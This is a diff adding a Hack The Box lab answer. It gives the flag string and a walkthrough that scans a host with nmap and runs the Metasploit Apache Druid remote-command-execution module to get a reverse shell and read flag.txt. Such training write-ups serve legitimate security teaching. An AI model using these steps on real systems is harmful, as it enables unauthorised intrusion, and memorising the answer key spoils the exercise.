@@ -630,3 +630,15 @@ Besides these, of course, there are a plethora of other payloads out there. Some
 
 Exploit the Apache Druid service and find the flag.txt file. Submit the contents of this file as the answer.
 
+`HTB{MSF_Expl01t4t10n}`
+* retrieve ip from webpage
+* use command `nmap -sC -sV <retrieved ip>` (this will check for service version detection "-sV" and use of default scripts to achieve it "-sC")
+* youll notice port 8888 has Apache Druid service on it, use [RAPID7](https://www.rapid7.com/db/) to check for Apache Druid vulnerabilities
+* youll find `Apache Druid 0.20.0 Remote Command Execution` with an actual Metasploit module for you to use , which is `exploit/linux/http/apache_druid_js_rce`
+* look for the module in msfconsole and use it
+* set the retrieved ip in as RHOSTS
+* set your attacker ip as LHOST
+* make sure the assigned RPORT is 8888 (same as in the attacked server)
+* run `exploit` command
+* once the reverse shell is achieved, type `cd ..`
+* run command `cat flag.txt`
